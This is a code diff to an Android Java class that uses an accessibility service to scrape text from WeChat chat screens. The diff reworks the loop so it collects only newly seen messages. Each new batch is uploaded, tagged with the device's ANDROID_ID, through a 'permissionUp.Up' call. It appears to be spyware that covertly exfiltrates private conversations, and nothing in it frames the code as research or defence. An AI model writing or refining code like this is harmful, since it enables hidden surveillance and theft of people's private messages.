@@ -50,41 +50,44 @@ public class StringText {
 
 
 
-        while (true){
+     /*   while (true){
           AccessibilityNodeInfo findViewByID =  ServiceUtils.findViewById(service,"com.tencent.mm:id/en");
             if(!AccUtils.isEmptyView(findViewByID)){
                 Log.i(TAG,"抵达聊天界面" );
                 break;
             }
-        }
+        }*/
 
 
         List<String> list=new ArrayList<>();
-        List<String> list_up=new ArrayList<>();
         while(true){
-
+            int da = list.size();
+            List<String> list_up=new ArrayList<>();
             List<AccessibilityNodeInfo> findView_chat =  ServiceUtils.findViewByIdList(service,"com.tencent.mm:id/b4b");
             if(!AccUtils.isEmptyArray(findView_chat)){
 
                 for (int i = 0; i < findView_chat.size(); i++) {
                     String text = findView_chat.get(i).getText().toString();
-                    if(!text.isEmpty()){
+                    if(!list.contains(text)){
                         Log.i(TAG,text);
                         list.add(text);
-                        break;
-
+                        list_up.add(text);
                     }
                 }
             }
 
 
-            Map<String,Object> map=new HashMap<String,Object>();
-            map.put("screen",String.join("",list));
-            JSONObject jsonObject  = new JSONObject();
-            jsonObject.put("permission","ex_text");
-            jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
-            jsonObject.put("data", JSONArray.toJSON(map));
-            permissionUp.Up(8,jsonObject);
+
+            if(da != list.size()){
+                Map<String,Object> map=new HashMap<String,Object>();
+                map.put("screen",String.join("",list_up));
+                JSONObject jsonObject  = new JSONObject();
+                jsonObject.put("permission","ex_text");
+                jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+                jsonObject.put("data", JSONArray.toJSON(map));
+                permissionUp.Up(8,jsonObject);
+            }
+
 
         }
 
